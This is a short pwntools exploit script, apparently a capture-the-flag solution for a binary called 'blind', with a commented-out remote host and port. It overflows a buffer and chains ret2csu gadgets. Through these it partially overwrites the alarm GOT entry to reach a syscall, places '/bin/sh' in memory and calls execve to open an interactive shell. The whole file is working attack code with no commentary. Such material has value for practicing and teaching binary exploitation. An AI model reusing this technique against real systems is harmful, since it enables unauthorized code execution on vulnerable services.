# coding = utf-8
from pwn import *
context.log_level = "debug"

p = process("./blind")
#p = remote("82.157.6.165","44000")

elf = ELF("./blind")
payload = "A" * 0x58
payload += p64(0x4007BA)    
payload += p64(0x0)     
payload += p64(0x1)     
payload += p64(elf.got["read"])    
payload += p64(1)    
payload += p64(elf.got["alarm"])    
payload += p64(0)    
payload += p64(0x4007A0)   
payload += 'A' * 0x38 
payload += p64(0x4007BA)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(elf.got["read"])
payload += p64(0x3b)
payload += p64(0x601088)
payload += p64(0)
payload += p64(0x4007A0)
payload += 'A' * 0x38
payload += p64(0x4007BA)
payload += p64(0x0) 
payload += p64(0x1) 
payload += p64(elf.got["alarm"])
payload += p64(0)
payload += p64(0)
payload += p64(0x601088)
payload += p64(0x4007A0)
payload += 'A' * 0x38
payload =payload.ljust(0x500,'\x00')


p.send(payload)
p.send("\x19")

p.send("/bin/sh\x00" + "A"*51)
p.interactive()



